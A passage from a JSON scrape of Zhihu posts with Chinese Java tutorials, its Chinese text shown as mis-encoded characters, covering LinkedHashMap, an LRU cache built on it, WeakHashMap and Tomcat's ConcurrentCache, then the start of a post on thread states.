class=\"cm\">/**\n</span><span class=\"cm\"> * The tail (youngest) of the doubly linked list.\n</span><span class=\"cm\"> */</span>\n<span class=\"kd\">transient</span> <span class=\"n\">LinkedHashMap</span><span class=\"o\">.</span><span class=\"na\">Entry</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span><span class=\"n\">V</span><span class=\"o\">&gt;</span> <span class=\"n\">tail</span><span class=\"o\">;</span></code></pre></div><p>accessOrder å†³å®šäº†é¡ºåºï¼Œé»˜è®¤ä¸º falseï¼Œæ­¤æ—¶ç»´æŠ¤çš„æ˜¯æ’å…¥é¡ºåºã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">final</span> <span class=\"kt\">boolean</span> <span class=\"n\">accessOrder</span><span class=\"o\">;</span></code></pre></div><p>LinkedHashMap æœ€é‡è¦çš„æ˜¯ä»¥ä¸‹ç”¨äºç»´æŠ¤é¡ºåºçš„å‡½æ•°ï¼Œå®ƒä»¬ä¼šåœ¨ putã€get ç­‰æ–¹æ³•ä¸­è°ƒç”¨ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kt\">void</span> <span class=\"nf\">afterNodeAccess</span><span class=\"o\">(</span><span class=\"n\">Node</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span><span class=\"n\">V</span><span class=\"o\">&gt;</span> <span class=\"n\">p</span><span class=\"o\">)</span> <span class=\"o\">{</span> <span class=\"o\">}</span>\n<span class=\"kt\">void</span> <span class=\"nf\">afterNodeInsertion</span><span class=\"o\">(</span><span class=\"kt\">boolean</span> <span class=\"n\">evict</span><span class=\"o\">)</span> <span class=\"o\">{</span> <span class=\"o\">}</span></code></pre></div><h3>afterNodeAccess()</h3><p>å½“ä¸€ä¸ªèŠ‚ç‚¹è¢«è®¿é—®æ—¶ï¼Œå¦‚æœ accessOrder ä¸º trueï¼Œåˆ™ä¼šå°†è¯¥èŠ‚ç‚¹ç§»åˆ°é“¾è¡¨å°¾éƒ¨ã€‚ä¹Ÿå°±æ˜¯è¯´æŒ‡å®šä¸º LRU é¡ºåºä¹‹åï¼Œåœ¨æ¯æ¬¡è®¿é—®ä¸€ä¸ªèŠ‚ç‚¹æ—¶ï¼Œä¼šå°†è¿™ä¸ªèŠ‚ç‚¹ç§»åˆ°é“¾è¡¨å°¾éƒ¨ï¼Œä¿è¯é“¾è¡¨å°¾éƒ¨æ˜¯æœ€è¿‘è®¿é—®çš„èŠ‚ç‚¹ï¼Œé‚£ä¹ˆé“¾è¡¨é¦–éƒ¨å°±æ˜¯æœ€è¿‘æœ€ä¹…æœªä½¿ç”¨çš„èŠ‚ç‚¹ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kt\">void</span> <span class=\"nf\">afterNodeAccess</span><span class=\"o\">(</span><span class=\"n\">Node</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span><span class=\"n\">V</span><span class=\"o\">&gt;</span> <span class=\"n\">e</span><span class=\"o\">)</span> <span class=\"o\">{</span> <span class=\"c1\">// move node to last\n</span><span class=\"c1\"></span>    <span class=\"n\">LinkedHashMap</span><span class=\"o\">.</span><span class=\"na\">Entry</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span><span class=\"n\">V</span><span class=\"o\">&gt;</span> <span class=\"n\">last</span><span class=\"o\">;</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">accessOrder</span> <span class=\"o\">&amp;&amp;</span> <span class=\"o\">(</span><span class=\"n\">last</span> <span class=\"o\">=</span> <span class=\"n\">tail</span><span class=\"o\">)</span> <span class=\"o\">!=</span> <span class=\"n\">e</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">LinkedHashMap</span><span class=\"o\">.</span><span class=\"na\">Entry</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span><span class=\"n\">V</span><span class=\"o\">&gt;</span> <span class=\"n\">p</span> <span class=\"o\">=</span>\n            <span class=\"o\">(</span><span class=\"n\">LinkedHashMap</span><span class=\"o\">.</span><span class=\"na\">Entry</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span><span class=\"n\">V</span><span class=\"o\">&gt;)</span><span class=\"n\">e</span><span class=\"o\">,</span> <span class=\"n\">b</span> <span class=\"o\">=</span> <span class=\"n\">p</span><span class=\"o\">.</span><span class=\"na\">before</span><span class=\"o\">,</span> <span class=\"n\">a</span> <span class=\"o\">=</span> <span class=\"n\">p</span><span class=\"o\">.</span><span class=\"na\">after</span><span class=\"o\">;</span>\n        <span class=\"n\">p</span><span class=\"o\">.</span><span class=\"na\">after</span> <span class=\"o\">=</span> <span class=\"kc\">null</span><span class=\"o\">;</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">b</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span>\n            <span class=\"n\">head</span> <span class=\"o\">=</span> <span class=\"n\">a</span><span class=\"o\">;</span>\n        <span class=\"k\">else</span>\n            <span class=\"n\">b</span><span class=\"o\">.</span><span class=\"na\">after</span> <span class=\"o\">=</span> <span class=\"n\">a</span><span class=\"o\">;</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">a</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span>\n            <span class=\"n\">a</span><span class=\"o\">.</span><span class=\"na\">before</span> <span class=\"o\">=</span> <span class=\"n\">b</span><span class=\"o\">;</span>\n        <span class=\"k\">else</span>\n            <span class=\"n\">last</span> <span class=\"o\">=</span> <span class=\"n\">b</span><span class=\"o\">;</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">last</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span>\n            <span class=\"n\">head</span> <span class=\"o\">=</span> <span class=\"n\">p</span><span class=\"o\">;</span>\n        <span class=\"k\">else</span> <span class=\"o\">{</span>\n            <span class=\"n\">p</span><span class=\"o\">.</span><span class=\"na\">before</span> <span class=\"o\">=</span> <span class=\"n\">last</span><span class=\"o\">;</span>\n            <span class=\"n\">last</span><span class=\"o\">.</span><span class=\"na\">after</span> <span class=\"o\">=</span> <span class=\"n\">p</span><span class=\"o\">;</span>\n        <span class=\"o\">}</span>\n        <span class=\"n\">tail</span> <span class=\"o\">=</span> <span class=\"n\">p</span><span class=\"o\">;</span>\n        <span class=\"o\">++</span><span class=\"n\">modCount</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><h3>afterNodeInsertion()</h3><p>åœ¨ put ç­‰æ“ä½œä¹‹åæ‰§è¡Œï¼Œå½“ removeEldestEntry() æ–¹æ³•è¿”å› true æ—¶ä¼šç§»é™¤æœ€æ™šçš„èŠ‚ç‚¹ï¼Œä¹Ÿå°±æ˜¯é“¾è¡¨é¦–éƒ¨èŠ‚ç‚¹ firstã€‚</p><p>evict åªæœ‰åœ¨æ„å»º Map çš„æ—¶å€™æ‰ä¸º falseï¼Œåœ¨è¿™é‡Œä¸º trueã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kt\">void</span> <span class=\"nf\">afterNodeInsertion</span><span class=\"o\">(</span><span class=\"kt\">boolean</span> <span class=\"n\">evict</span><span class=\"o\">)</span> <span class=\"o\">{</span> <span class=\"c1\">// possibly remove eldest\n</span><span class=\"c1\"></span>    <span class=\"n\">LinkedHashMap</span><span class=\"o\">.</span><span class=\"na\">Entry</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span><span class=\"n\">V</span><span class=\"o\">&gt;</span> <span class=\"n\">first</span><span class=\"o\">;</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">evict</span> <span class=\"o\">&amp;&amp;</span> <span class=\"o\">(</span><span class=\"n\">first</span> <span class=\"o\">=</span> <span class=\"n\">head</span><span class=\"o\">)</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">removeEldestEntry</span><span class=\"o\">(</span><span class=\"n\">first</span><span class=\"o\">))</span> <span class=\"o\">{</span>\n        <span class=\"n\">K</span> <span class=\"n\">key</span> <span class=\"o\">=</span> <span class=\"n\">first</span><span class=\"o\">.</span><span class=\"na\">key</span><span class=\"o\">;</span>\n        <span class=\"n\">removeNode</span><span class=\"o\">(</span><span class=\"n\">hash</span><span class=\"o\">(</span><span class=\"n\">key</span><span class=\"o\">),</span> <span class=\"n\">key</span><span class=\"o\">,</span> <span class=\"kc\">null</span><span class=\"o\">,</span> <span class=\"kc\">false</span><span class=\"o\">,</span> <span class=\"kc\">true</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><p>removeEldestEntry() é»˜è®¤ä¸º falseï¼Œå¦‚æœéœ€è¦è®©å®ƒä¸º trueï¼Œéœ€è¦ç»§æ‰¿ LinkedHashMap å¹¶ä¸”è¦†ç›–è¿™ä¸ªæ–¹æ³•çš„å®ç°ï¼Œè¿™åœ¨å®ç° LRU çš„ç¼“å­˜ä¸­ç‰¹åˆ«æœ‰ç”¨ï¼Œé€šè¿‡ç§»é™¤æœ€è¿‘æœ€ä¹…æœªä½¿ç”¨çš„èŠ‚ç‚¹ï¼Œä»è€Œä¿è¯ç¼“å­˜ç©ºé—´è¶³å¤Ÿï¼Œå¹¶ä¸”ç¼“å­˜çš„æ•°æ®éƒ½æ˜¯çƒ­ç‚¹æ•°æ®ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">protected</span> <span class=\"kt\">boolean</span> <span class=\"nf\">removeEldestEntry</span><span class=\"o\">(</span><span class=\"n\">Map</span><span class=\"o\">.</span><span class=\"na\">Entry</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span><span class=\"n\">V</span><span class=\"o\">&gt;</span> <span class=\"n\">eldest</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">return</span> <span class=\"kc\">false</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h3>LRU ç¼“å­˜</h3><p>ä»¥ä¸‹æ˜¯ä½¿ç”¨ LinkedHashMap å®ç°çš„ä¸€ä¸ª LRU ç¼“å­˜ï¼š</p><ul><li>è®¾å®šæœ€å¤§ç¼“å­˜ç©ºé—´ MAX_ENTRIES  ä¸º 3ï¼›</li><li>ä½¿ç”¨ LinkedHashMap çš„æ„é€ å‡½æ•°å°† accessOrder è®¾ç½®ä¸º trueï¼Œå¼€å¯ LRU é¡ºåºï¼›</li><li>è¦†ç›– removeEldestEntry() æ–¹æ³•å®ç°ï¼Œåœ¨èŠ‚ç‚¹å¤šäº MAX_ENTRIES å°±ä¼šå°†æœ€è¿‘æœ€ä¹…æœªä½¿ç”¨çš„æ•°æ®ç§»é™¤ã€‚</li></ul><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">class</span> <span class=\"nc\">LRUCache</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span> <span class=\"n\">V</span><span class=\"o\">&gt;</span> <span class=\"kd\">extends</span> <span class=\"n\">LinkedHashMap</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span> <span class=\"n\">V</span><span class=\"o\">&gt;</span> <span class=\"o\">{</span>\n    <span class=\"kd\">private</span> <span class=\"kd\">static</span> <span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"n\">MAX_ENTRIES</span> <span class=\"o\">=</span> <span class=\"n\">3</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">protected</span> <span class=\"kt\">boolean</span> <span class=\"nf\">removeEldestEntry</span><span class=\"o\">(</span><span class=\"n\">Map</span><span class=\"o\">.</span><span class=\"na\">Entry</span> <span class=\"n\">eldest</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"n\">size</span><span class=\"o\">()</span> <span class=\"o\">&gt;</span> <span class=\"n\">MAX_ENTRIES</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"n\">LRUCache</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"kd\">super</span><span class=\"o\">(</span><span class=\"n\">MAX_ENTRIES</span><span class=\"o\">,</span> <span class=\"n\">0</span><span class=\"o\">.</span><span class=\"na\">75f</span><span class=\"o\">,</span> <span class=\"kc\">true</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">LRUCache</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">,</span> <span class=\"n\">String</span><span class=\"o\">&gt;</span> <span class=\"n\">cache</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">LRUCache</span><span class=\"o\">&lt;&gt;();</span>\n    <span class=\"n\">cache</span><span class=\"o\">.</span><span class=\"na\">put</span><span class=\"o\">(</span><span class=\"n\">1</span><span class=\"o\">,</span> <span class=\"s\">&#34;a&#34;</span><span class=\"o\">);</span>\n    <span class=\"n\">cache</span><span class=\"o\">.</span><span class=\"na\">put</span><span class=\"o\">(</span><span class=\"n\">2</span><span class=\"o\">,</span> <span class=\"s\">&#34;b&#34;</span><span class=\"o\">);</span>\n    <span class=\"n\">cache</span><span class=\"o\">.</span><span class=\"na\">put</span><span class=\"o\">(</span><span class=\"n\">3</span><span class=\"o\">,</span> <span class=\"s\">&#34;c&#34;</span><span class=\"o\">);</span>\n    <span class=\"n\">cache</span><span class=\"o\">.</span><span class=\"na\">get</span><span class=\"o\">(</span><span class=\"n\">1</span><span class=\"o\">);</span>\n    <span class=\"n\">cache</span><span class=\"o\">.</span><span class=\"na\">put</span><span class=\"o\">(</span><span class=\"n\">4</span><span class=\"o\">,</span> <span class=\"s\">&#34;d&#34;</span><span class=\"o\">);</span>\n    <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">cache</span><span class=\"o\">.</span><span class=\"na\">keySet</span><span class=\"o\">());</span>\n<span class=\"o\">}</span>\n<span class=\"o\">[</span><span class=\"n\">3</span><span class=\"o\">,</span> <span class=\"n\">1</span><span class=\"o\">,</span> <span class=\"n\">4</span><span class=\"o\">]</span></code></pre></div><h2>WeakHashMap</h2><h3>å­˜å‚¨ç»“æ„</h3><p>WeakHashMap çš„ Entry ç»§æ‰¿è‡ª WeakReferenceï¼Œè¢« WeakReference å…³è”çš„å¯¹è±¡åœ¨ä¸‹ä¸€æ¬¡åƒåœ¾å›æ”¶æ—¶ä¼šè¢«å›æ”¶ã€‚</p><p>WeakHashMap ä¸»è¦ç”¨æ¥å®ç°ç¼“å­˜ï¼Œé€šè¿‡ä½¿ç”¨ WeakHashMap æ¥å¼•ç”¨ç¼“å­˜å¯¹è±¡ï¼Œç”± JVM å¯¹è¿™éƒ¨åˆ†ç¼“å­˜è¿›è¡Œå›æ”¶ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">private</span> <span class=\"kd\">static</span> <span class=\"kd\">class</span> <span class=\"nc\">Entry</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span><span class=\"n\">V</span><span class=\"o\">&gt;</span> <span class=\"kd\">extends</span> <span class=\"n\">WeakReference</span><span class=\"o\">&lt;</span><span class=\"n\">Object</span><span class=\"o\">&gt;</span> <span class=\"kd\">implements</span> <span class=\"n\">Map</span><span class=\"o\">.</span><span class=\"na\">Entry</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span><span class=\"n\">V</span><span class=\"o\">&gt;</span></code></pre></div><h3>ConcurrentCache</h3><p>Tomcat ä¸­çš„ ConcurrentCache ä½¿ç”¨äº† WeakHashMap æ¥å®ç°ç¼“å­˜åŠŸèƒ½ã€‚</p><p>ConcurrentCache é‡‡å–çš„æ˜¯åˆ†ä»£ç¼“å­˜ï¼š</p><ul><li>ç»å¸¸ä½¿ç”¨çš„å¯¹è±¡æ”¾å…¥ eden ä¸­ï¼Œeden ä½¿ç”¨ ConcurrentHashMap å®ç°ï¼Œä¸ç”¨æ‹…å¿ƒä¼šè¢«å›æ”¶ï¼ˆä¼Šç”¸å›­ï¼‰ï¼›</li><li>ä¸å¸¸ç”¨çš„å¯¹è±¡æ”¾å…¥ longtermï¼Œlongterm ä½¿ç”¨ WeakHashMap å®ç°ï¼Œè¿™äº›è€å¯¹è±¡ä¼šè¢«åƒåœ¾æ”¶é›†å™¨å›æ”¶ã€‚</li><li>å½“è°ƒç”¨  get() æ–¹æ³•æ—¶ï¼Œä¼šå…ˆä» eden åŒºè·å–ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°çš„è¯å†åˆ° longterm è·å–ï¼Œå½“ä» longterm è·å–åˆ°å°±æŠŠå¯¹è±¡æ”¾å…¥ eden ä¸­ï¼Œä»è€Œä¿è¯ç»å¸¸è¢«è®¿é—®çš„èŠ‚ç‚¹ä¸å®¹æ˜“è¢«å›æ”¶ã€‚</li><li>å½“è°ƒç”¨ put() æ–¹æ³•æ—¶ï¼Œå¦‚æœ eden çš„å¤§å°è¶…è¿‡äº† sizeï¼Œé‚£ä¹ˆå°±å°† eden ä¸­çš„æ‰€æœ‰å¯¹è±¡éƒ½æ”¾å…¥ longterm ä¸­ï¼Œåˆ©ç”¨è™šæ‹Ÿæœºå›æ”¶æ‰ä¸€éƒ¨åˆ†ä¸ç»å¸¸ä½¿ç”¨çš„å¯¹è±¡ã€‚</li></ul><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">final</span> <span class=\"kd\">class</span> <span class=\"nc\">ConcurrentCache</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span> <span class=\"n\">V</span><span class=\"o\">&gt;</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">private</span> <span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"n\">size</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">private</span> <span class=\"kd\">final</span> <span class=\"n\">Map</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span> <span class=\"n\">V</span><span class=\"o\">&gt;</span> <span class=\"n\">eden</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">private</span> <span class=\"kd\">final</span> <span class=\"n\">Map</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span> <span class=\"n\">V</span><span class=\"o\">&gt;</span> <span class=\"n\">longterm</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">public</span> <span class=\"nf\">ConcurrentCache</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">size</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">size</span> <span class=\"o\">=</span> <span class=\"n\">size</span><span class=\"o\">;</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">eden</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ConcurrentHashMap</span><span class=\"o\">&lt;&gt;(</span><span class=\"n\">size</span><span class=\"o\">);</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">longterm</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">WeakHashMap</span><span class=\"o\">&lt;&gt;(</span><span class=\"n\">size</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"n\">V</span> <span class=\"nf\">get</span><span class=\"o\">(</span><span class=\"n\">K</span> <span class=\"n\">k</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">V</span> <span class=\"n\">v</span> <span class=\"o\">=</span> <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">eden</span><span class=\"o\">.</span><span class=\"na\">get</span><span class=\"o\">(</span><span class=\"n\">k</span><span class=\"o\">);</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">v</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"n\">v</span> <span class=\"o\">=</span> <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">longterm</span><span class=\"o\">.</span><span class=\"na\">get</span><span class=\"o\">(</span><span class=\"n\">k</span><span class=\"o\">);</span>\n            <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">v</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span>\n                <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">eden</span><span class=\"o\">.</span><span class=\"na\">put</span><span class=\"o\">(</span><span class=\"n\">k</span><span class=\"o\">,</span> <span class=\"n\">v</span><span class=\"o\">);</span>\n        <span class=\"o\">}</span>\n        <span class=\"k\">return</span> <span class=\"n\">v</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">put</span><span class=\"o\">(</span><span class=\"n\">K</span> <span class=\"n\">k</span><span class=\"o\">,</span> <span class=\"n\">V</span> <span class=\"n\">v</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">eden</span><span class=\"o\">.</span><span class=\"na\">size</span><span class=\"o\">()</span> <span class=\"o\">&gt;=</span> <span class=\"n\">size</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">longterm</span><span class=\"o\">.</span><span class=\"na\">putAll</span><span class=\"o\">(</span><span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">eden</span><span class=\"o\">);</span>\n            <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">eden</span><span class=\"o\">.</span><span class=\"na\">clear</span><span class=\"o\">();</span>\n        <span class=\"o\">}</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">eden</span><span class=\"o\">.</span><span class=\"na\">put</span><span class=\"o\">(</span><span class=\"n\">k</span><span class=\"o\">,</span> <span class=\"n\">v</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><h2>å‚è€ƒèµ„æ–™</h2><ul><li>Eckel B. Java ç¼–ç¨‹æ€æƒ³ [M]. æœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾, 2002.</li><li><a href=\"https://link.zhihu.com/?target=https%3A//www.w3resource.com/java-tutorial/java-collections.php\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Java Collection Framework</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//openhome.cc/Gossip/DesignPattern/IteratorPattern.htm\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Iterator æ¨¡å¼</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//tech.meituan.com/java_hashmap.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Java 8 ç³»åˆ—ä¹‹é‡æ–°è®¤è¯† HashMap</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//javarevisited.blogspot.hk/2010/10/difference-between-hashmap-and.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">What is difference between HashMap and Hashtable in Java?</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//www.zhangchangle.com/2018/02/07/Java%25E9%259B%2586%25E5%2590%2588%25E4%25B9%258BHashMap/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Java é›†åˆä¹‹ HashMap</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//www.programering.com/a/MDO3QDNwATM.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">The principle of ConcurrentHashMap analysis</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//www.ibm.com/developerworks/cn/java/java-lo-concurrenthashmap/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">æ¢ç´¢ ConcurrentHashMap é«˜å¹¶å‘æ€§çš„å®ç°æœºåˆ¶</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//www.jianshu.com/p/75adf47958a7\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">HashMap ç›¸å…³é¢è¯•é¢˜åŠå…¶è§£ç­”</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//wiki.jikexueyuan.com/project/java-enhancement/java-thirtysix.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Java é›†åˆç»†èŠ‚ï¼ˆäºŒï¼‰ï¼šasList çš„ç¼ºé™·</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//javaconceptoftheday.com/java-collection-framework-linkedlist-class/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Java Collection Framework â€“ The LinkedList Class</a></li></ul><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-0cc31b487492e9104150995ef37f51ba_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"868\" data-rawheight=\"355\" class=\"origin_image zh-lightbox-thumb\" width=\"868\" data-original=\"https://pic3.zhimg.com/v2-0cc31b487492e9104150995ef37f51ba_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;868&#39; height=&#39;355&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"868\" data-rawheight=\"355\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"868\" data-original=\"https://pic3.zhimg.com/v2-0cc31b487492e9104150995ef37f51ba_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-0cc31b487492e9104150995ef37f51ba_b.jpg\"/></figure><p></p>", 
            "topic": [
                {
                    "tag": "Java", 
                    "tagLink": "https://api.zhihu.com/topics/19561132"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/59850678", 
            "userName": "CyC2018", 
            "userLink": "https://www.zhihu.com/people/de0dbaba77411ee53dd3207d762ad7d5", 
            "upvote": 1, 
            "title": "Java å¹¶å‘", 
            "content": "<p></p><h2>ä¸€ã€çº¿ç¨‹çŠ¶æ€è½¬æ¢</h2><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-92bfc3cfc5d103d5a97daf2815f960cc_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"955\" data-rawheight=\"540\" class=\"origin_image zh-lightbox-thumb\" width=\"955\" data-original=\"https://pic1.zhimg.com/v2-92bfc3cfc5d103d5a97daf2815f960cc_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;955&#39; height=&#39;540&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"955\" data-rawheight=\"540\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"955\" data-original=\"https://pic1.zhimg.com/v2-92bfc3cfc5d103d5a97daf2815f960cc_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-92bfc3cfc5d103d5a97daf2815f960cc_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>æ–°å»ºï¼ˆNewï¼‰</h2><p>åˆ›å»ºåå°šæœªå¯åŠ¨ã€‚</p><h2>å¯è¿è¡Œï¼ˆRunnableï¼‰</h2><p>å¯èƒ½æ­£åœ¨è¿è¡Œï¼Œä¹Ÿå¯èƒ½æ­£åœ¨ç­‰å¾… CPU æ—¶é—´ç‰‡ã€‚</p><p>åŒ…å«äº†æ“ä½œç³»ç»Ÿçº¿ç¨‹çŠ¶æ€ä¸­çš„ Running å’Œ Readyã€‚</p><h2>é˜»å¡ï¼ˆBlockedï¼‰</h2><p>ç­‰å¾…è·å–ä¸€ä¸ªæ’å®ƒé”ï¼Œå¦‚æœå…¶çº¿ç¨‹é‡Šæ”¾äº†é”å°±ä¼šç»“æŸæ­¤çŠ¶æ€ã€‚</p><h2>æ— é™æœŸç­‰å¾…ï¼ˆWaitingï¼‰</h2><p>ç­‰å¾…å…¶å®ƒçº¿ç¨‹æ˜¾å¼åœ°å”¤é†’ï¼Œå¦åˆ™ä¸ä¼šè¢«åˆ†é… CPU æ—¶é—´ç‰‡ã€‚</p><p>| è¿›å…¥æ–¹æ³• | é€€å‡ºæ–¹æ³• | | --- | --- | | æ²¡æœ‰è®¾ç½® Timeout å‚æ•°çš„ Object.wait() æ–¹æ³• | Object.notify() / Object.notifyAll() | | æ²¡æœ‰è®¾ç½® Timeout å‚æ•°çš„ Thread.join() æ–¹æ³• | è¢«è°ƒç”¨çš„çº¿ç¨‹æ‰§è¡Œå®Œæ¯• | | LockSupport.park() æ–¹æ³• | LockSupport.unpark(Thread) |</p><h2>é™æœŸç­‰å¾…ï¼ˆTimed Waitingï¼‰</h2><p>æ— 